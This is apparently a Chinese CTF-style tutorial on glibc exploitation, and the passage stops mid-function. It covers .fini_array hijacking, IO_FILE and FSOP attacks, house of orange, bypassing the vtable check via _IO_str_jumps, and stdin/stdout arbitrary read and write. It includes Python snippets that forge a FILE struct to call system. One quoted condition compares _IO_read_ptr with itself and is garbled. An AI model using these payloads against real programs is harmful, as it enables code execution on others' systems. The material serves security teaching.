+<p><a href="https://imgchr.com/i/ypZySf" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/28/ypZySf.png" alt="ypZySf.png"></a></p>
+<p>程序运行流程更加细化如下所示</p>
+<pre><code>_start---&gt;__libc_start_main---&gt;init---&gt;.init_array[0]---&gt;.init_array[1]---&gt;...---&gt;.init_array[n]---&gt;main---&gt;fini---&gt;.fini_array[n]---&gt;.fini_array[n-1]---&gt;...---&gt;.fini_array[0]</code></pre><p>.init_array内的函数顺序执行，.fini_array内的函数逆序执行</p>
+<p>将.fini_array[1]修改为main函数的地址，将.fini_array[0]修改为fini函数的地址，就可以无限循环了，流程如下</p>
+<pre><code>_start---&gt;__libc_start_main---&gt;init---&gt;.init_array[0]---&gt;.init_array[1]---&gt;main---&gt;fini---&gt;.fini_array[1](main)---&gt;.fini_array[0](fini)</code></pre><h2 id="0x12-IO-FILE结构体攻击"><a href="#0x12-IO-FILE结构体攻击" class="headerlink" title="0x12.IO_FILE结构体攻击"></a>0x12.IO_FILE结构体攻击</h2><p>接上面的house of orange</p>
+<p>FILE结构体中有几个重要的指针</p>
+<pre><code>_IO_buf_base：输入输出缓冲区基地址
+_IO_buf_end：输入输出缓冲区结束地址
+_IO_write_base：输出缓冲区基地址
+_IO_write_ptr：输出缓冲区已使用的地址
+_IO_write_end：输出缓冲区结束地址
+_IO_read_ptr：输入缓冲区的起始地址
+_IO_read_end:输入缓冲区的结束地址</code></pre><p>引用raycp大佬的解释</p>
+<blockquote>
+<p>其中<code>_IO_buf_base</code>和<code>_IO_buf_end</code>是缓冲区建立函数<code>_IO_doallocbuf</code>（上一篇详细描述过）会在里面建立输入输出缓冲区，并把基地址保存在<code>_IO_buf_base</code>中，结束地址保存在<code>_IO_buf_end</code>中。在建立里输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址址给<code>_IO_write_base</code>，结束地址给<code>_IO_write_end</code>，同时<code>_IO_write_ptr</code>表示为已经使用的地址。即<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的空间是已经使用的缓冲区，<code>_IO_write_ptr</code>到<code>_IO_write_end</code>之间为剩余的输出缓冲区。</p>
+</blockquote>
+<p>还需要介绍几个函数(以下引用ctfwiki上的介绍)</p>
+<h3 id="1-fread"><a href="#1-fread" class="headerlink" title="1.fread"></a>1.fread</h3><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p>
+<pre class=" language-c"><code class="language-c">size_t <span class="token function">fread</span> <span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> size_t count<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span> <span class="token punctuation">;</span></code></pre>
+<p>fread 的代码位于 /libio/iofread.c 中，函数名为<code>_IO_fread</code>，但真正的功能实现在子函数<code>_IO_sgetn</code> 中。</p>
+<pre class=" language-c"><code class="language-c">_IO_size_t
+<span class="token function">_IO_fread</span> <span class="token punctuation">(</span>buf<span class="token punctuation">,</span> size<span class="token punctuation">,</span> count<span class="token punctuation">,</span> fp<span class="token punctuation">)</span>
+     <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>
+     _IO_size_t size<span class="token punctuation">;</span>
+     _IO_size_t count<span class="token punctuation">;</span>
+     _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
+<span class="token punctuation">{</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  bytes_read <span class="token operator">=</span> <span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> bytes_requested<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span></code></pre>
+<p>在<code>_IO_sgetn</code> 函数中会调用<code>_IO_XSGETN</code>，而<code>_IO_XSGETN</code> 是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>
+<pre class=" language-c"><code class="language-c">_IO_size_t
+<span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+     _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
+     <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
+     _IO_size_t n<span class="token punctuation">;</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">return</span> <span class="token function">_IO_XSGETN</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的，</p>
+<pre class=" language-c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base
+          <span class="token operator">&amp;&amp;</span> want <span class="token operator">&lt;</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__underflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+          <span class="token keyword">continue</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span></code></pre>
+<p><code>__underflow</code>会调用<code>_IO_UNDERFLOW</code>，<code>_IO_UNDERFLOW</code>又会调用<code>_IO_new_file_underflow</code>，<code>_IO_new_file_underflow</code>最终会调用<code>_IO_SYSREAD</code>函数来执行read系统调用</p>
+<pre class=" language-c"><code class="language-c">count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>
+           fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>调用<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数），该函数最终执行系统调用read，读取文件数据，数据读入到<code>fp-&gt;_IO_buf_base</code>中，读入大小为输入缓冲区的大小<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>。</p>
+<p>设置输入缓冲区已有数据的size，即设置<code>fp-&gt;_IO_read_end</code>为<code>fp-&gt;_IO_read_end += count</code>。</p>
+<h3 id="2-fwrite"><a href="#2-fwrite" class="headerlink" title="2.fwrite"></a>2.fwrite</h3><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p>
+<pre class=" language-c"><code class="language-c">size_t <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span> buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> size_t count<span class="token punctuation">,</span> FILE<span class="token operator">*</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为<code>_IO_fwrite</code>。 在<code>_IO_fwrite</code> 中主要是调用<code>_IO_XSPUTN</code> 来实现写入的功能。</p>
+<p>根据前面对<code>_IO_FILE_plus</code> 的介绍，可知<code>_IO_XSPUTN</code> 位于<code>_IO_FILE_plus</code> 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p>
+<pre class=" language-c"><code class="language-c">written <span class="token operator">=</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>在<code>_IO_XSPUTN</code> 对应的默认函数<code>_IO_new_file_xsputn</code> 中会调用同样位于 vtable 中的<code>_IO_OVERFLOW</code></p>
+<pre class=" language-c"><code class="language-c"> <span class="token comment" spellcheck="true">/* Next flush the (full) buffer. */</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span></code></pre>
+<p><code>_IO_OVERFLOW</code> 默认对应的函数是<code>_IO_new_file_overflow</code></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>
+             f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">==</span> f<span class="token operator">-></span>_IO_buf_end <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* Buffer is really full */</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
+      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span></code></pre>
+<p>在<code>_IO_new_file_overflow</code> 内部最终会调用系统接口 write 函数</p>
+<pre class=" language-c"><code class="language-c">count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>输出的内容为<code>f-&gt;_IO_write_ptr</code>到<code>f-&gt;_IO_write_base</code>之间的内容</p>
+<h3 id="3-printf-puts"><a href="#3-printf-puts" class="headerlink" title="3.printf/puts"></a>3.printf/puts</h3><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p>
+<p>puts 在源码中实现的函数是<code>_IO_puts</code>，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的<code>_IO_sputn</code>，结果会执行<code>_IO_new_file_xsputn</code>，最后会调用到系统接口 write 函数。</p>
+<p>printf 的调用栈回溯如下，同样是通过<code>_IO_file_xsputn</code> 实现</p>
+<pre><code>vfprintf+11
+_IO_file_xsputn
+_IO_file_overflow
+funlockfile
+_IO_file_write
+write</code></pre><p>前置知识先说到这，后面讲到相关攻击手法时会继续说明</p>
+<h3 id="4-FSOP-File-Stream-Oriented-Programming"><a href="#4-FSOP-File-Stream-Oriented-Programming" class="headerlink" title="4.FSOP(File Stream Oriented Programming)"></a>4.FSOP(File Stream Oriented Programming)</h3><p>根据对fread、fwrite、printf等IO函数源码的分析，可以知道这些函数最终都是调用了IO_FILE_plus中vtable内的函数</p>
+<p>引用raycp大佬的总结</p>
+<p><code>fopen</code>函数是在分配空间，建立FILE结构体，未调用vtable中的函数。</p>
+<p><code>fread</code>函数中调用的vtable函数有：</p>
+<ul>
+<li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li>
+<li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li>
+<li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li>
+<li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li>
+<li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li>
+</ul>
+<p><code>fwrite</code> 函数调用的vtable函数有：</p>
+<ul>
+<li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li>
+<li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li>
+<li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li>
+<li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li>
+<li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li>
+</ul>
+<p><code>fclose</code>函数调用的vtable函数有：</p>
+<ul>
+<li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li>
+<li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li>
+<li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。</li>
+</ul>
+<p>house of orange的利用关键就在于控制<code>_IO_list_all</code>，一般使用unsorted bin attack将<code>_IO_list_all</code>的值修改为main_arena+88，再将unsortedbin的size修改为0x60，并将其伪造为一个FILE结构体，且在适当偏移的位置处伪造好vtable，将vtable中<code>_IO_OVERFLOW</code>函数的位置修改为system，当我们申请chunk时会报错，unsortedbin会被放入0x60大小的smallbin链中，相对于main_arena+88的便宜为0x68，在FILE结构体中正好是chain的位置，于是<code>_IO_list_all</code>就顺着chain找到了我们伪造的FILE结构体和vtable。</p>
+<p>令，如果程序只能分配0x50(最终分配0x60)的chunk，那么该怎么利用?可以将unsortedbin修改为0xb1大小，这样做的原因是：当<code>_IO_list_all</code>指向main_arena+88时，此时的chain为大小为0x60的smallbin那条链；当跳到0x60的smallbin那条链时，偏移0x68位置处(即chain的位置)又是大小为0xb0的smallbin的链，如下图所示</p>
+<p><a href="https://imgchr.com/i/y9KY7D" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/28/y9KY7D.png" alt="y9KY7D.png"></a></p>
+<p>我们可以通过两跳来利用house of orange</p>
+<h3 id="5-绕过vtable-check"><a href="#5-绕过vtable-check" class="headerlink" title="5.绕过vtable check"></a>5.绕过vtable check</h3><p>glibc&gt;=2.24的环境下，对于vtable的地址增加了检查，限制其在<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间</p>
+<p>绕过方法就是使用libc内部的vtable<code>_IO_str_jumps</code>或<code>_IO_wstr_jumps</code></p>
+<p><code>_IO_str_jumps</code>函数表如下</p>
+<p><a href="https://imgchr.com/i/y9lDj1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/28/y9lDj1.png" alt="y9lDj1.png"></a></p>
+<p>其中有两个函数可以利用：<code>_IO_str_overflow</code>和<code>_IO_str_finish</code></p>
+<p><code>_IO_str_overflow</code>的利用条件总结如下</p>
+<pre><code>_flags = 0
+_IO_write_ptr = 0x7fffffffffffffff
+_IO_write_base = 0
+_IO_buf_end = (binsh-100)/2
+_IO_buf_base = 0</code></pre><pre class=" language-python"><code class="language-python">fake_file <span class="token operator">=</span> IO_FILE_plus_struct<span class="token punctuation">(</span><span class="token punctuation">)</span>
+fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span>
+fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span>
+fake_file<span class="token punctuation">.</span>_IO_write_base<span class="token operator">=</span><span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">0x7fffffffffffffff</span>
+fake_file<span class="token punctuation">.</span>_IO_buf_base<span class="token operator">=</span><span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>_IO_buf_end<span class="token operator">=</span><span class="token punctuation">(</span>binsh<span class="token number">-100</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span>
+fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>_IO_str_jumps
+
+pay<span class="token operator">+=</span>str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre>
+<p><code>_IO_str_finish</code>的利用条件总结如下</p>
+<pre><code>fp-&gt;_flags&amp;1==0
+fp-&gt;_mode &lt;= 0 
+fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
+fp-&gt;_IO_buf_base=binsh
+fp-&gt;vtable=_IO_str_jumps-8
+fp+0xe8=system</code></pre><pre class=" language-python"><code class="language-python">fake_file <span class="token operator">=</span> IO_FILE_plus_struct<span class="token punctuation">(</span><span class="token punctuation">)</span>
+fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span>
+fake_file<span class="token punctuation">.</span>_IO_read_base <span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span>
+fake_file<span class="token punctuation">.</span>_IO_buf_base <span class="token operator">=</span> binsh
+fake_file<span class="token punctuation">.</span>_mode <span class="token operator">=</span> <span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>_IO_write_base <span class="token operator">=</span> <span class="token number">0</span>
+fake_file<span class="token punctuation">.</span>_IO_write_ptr <span class="token operator">=</span> <span class="token number">1</span>
+fake_file<span class="token punctuation">.</span>vtable <span class="token operator">=</span> _IO_str_jumps<span class="token number">-8</span>
+
+pay<span class="token operator">+=</span>str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre>
+<h3 id="6-IO-FILE-之任意读写"><a href="#6-IO-FILE-之任意读写" class="headerlink" title="6.IO FILE 之任意读写"></a>6.IO FILE 之任意读写</h3><h4 id="1-stdin标准输入缓冲区进行任意地址写"><a href="#1-stdin标准输入缓冲区进行任意地址写" class="headerlink" title="1.stdin标准输入缓冲区进行任意地址写"></a>1.<code>stdin</code>标准输入缓冲区进行任意地址写</h4><p>在前面的fread调用链中，看到fread最终调用了<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code>函数来读入数据，因此要想利用<code>stdin</code>输入缓冲区需设置FILE结构体中<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>。</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span>
+<span class="token function">_IO_new_file_underflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  _IO_ssize_t count<span class="token punctuation">;</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  ## 如果存在_IO_NO_READS标志，则直接返回
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_READS<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>
+      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  ## 如果输入缓冲区里存在数据，则直接返回
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+  ##调用_IO_SYSREAD函数最终执行系统调用读取数据
+  count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>
+               fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+<span class="token punctuation">}</span>
+<span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_underflow<span class="token punctuation">,</span> _IO_file_underflow<span class="token punctuation">)</span></code></pre>
+<p>所有的条件总结如下为：</p>
+<ol>
+<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>。</li>
+<li>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>。</li>
+<li>设置<code>_fileno</code>为0。</li>
+<li>设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>；且使得<code>_IO_buf_end-_IO_buf_base</code>大于fread要读的数据。</li>
+</ol>
+<p>通常就是修改<code>_IO_buf_base</code>的低字节，然后就能够通过scanf或者其他调用IO函数的函数来修改FILE结构体，从而进一步劫持程序流。</p>
+<p>还有需要注意的一点</p>
+<p>在<code>_IO_new_file_underflow</code>函数中，有这个判断</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span></code></pre>
+<p>也就是说只有当<code>_IO_read_ptr</code>等于<code>_IO_read_ptr</code>时，才会调用<code>_IO_SYSREAD</code>来写入数据</p>
+<p>而在<code>_IO_SYSREAD</code>函数执行完后，有</p>
+<pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_IO_read_end <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span></code></pre>
+<p>这样的话我们想要再次利用IO_FILE来进行写数据的话就不能成功了，因此我们需要增大<code>_IO_read_ptr</code>使其满足上面的判断</p>
+<p>如何增大？</p>
+<p><code>IO_getc</code>或者<code>getchar</code>每执行一次都会使<code>_IO_read_ptr</code>+1，可以多次调用这两个函数来满足判断。</p>
+<h4 id="2-stdout标准输入缓冲区进行任意地址读写"><a href="#2-stdout标准输入缓冲区进行任意地址读写" class="headerlink" title="2.stdout标准输入缓冲区进行任意地址读写"></a>2.<code>stdout</code>标准输入缓冲区进行任意地址读写</h4><h5 id="1-任意写"><a href="#1-任意写" class="headerlink" title="1.任意写"></a>1.任意写</h5><blockquote>
+<p>任意写的主要原理为：构造好输出缓冲区将其改为想要任意写的地址，当输出数据可控时，会将数据拷贝至输出缓冲区，即实现了将可控数据拷贝至我们想要写的地址。</p>
+</blockquote>
+<p>相关源码如下</p>
+<pre class=" language-c"><code class="language-c">_IO_size_t
+<span class="token function">_IO_new_file_xsputn</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">)</span>
+<span class="token punctuation">{</span> 
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    ## 判断输出缓冲区还有多少空间
+    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_end <span class="token operator">></span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">)</span>
+    count <span class="token operator">=</span> f<span class="token operator">-></span>_IO_write_end <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Space available. */</span>
+
+  ## 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+      <span class="token function">memcpy</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">,</span> s<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>只需要将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可</p>
+<h5 id="2-任意读"><a href="#2-任意读" class="headerlink" title="2.任意读"></a>2.任意读</h5><blockquote>
+<p>利用<code>stdout</code>进行任意地址读的原理为：控制输出缓冲区指针指向我们输入的地址，构造好条件，使得输出缓冲区为已经满的状态，再次调用输出函数时，程序会刷新输出缓冲区即会输出我们想要的数据，实现任意读。</p>
+</blockquote>
+<p>核心代码如下</p>
+<pre class=" language-c"><code class="language-c"><span class="token function">_IO_new_file_overflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">int</span> ch<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  ## 判断标志位是否包含_IO_NO_WRITES
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_WRITES<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* SET ERROR */</span>
+    <span class="token punctuation">{</span>
+      f<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>
+      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+  ## 判断输出缓冲区是否为空
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> f<span class="token operator">-></span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+
+  ## 输出输出缓冲区 
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>
+             f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> ch<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span></code></pre>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span>
+_IO_size_t
+<span class="token function">new_do_write</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t to_do<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  _IO_size_t count<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_IS_APPENDING<span class="token punctuation">)</span>
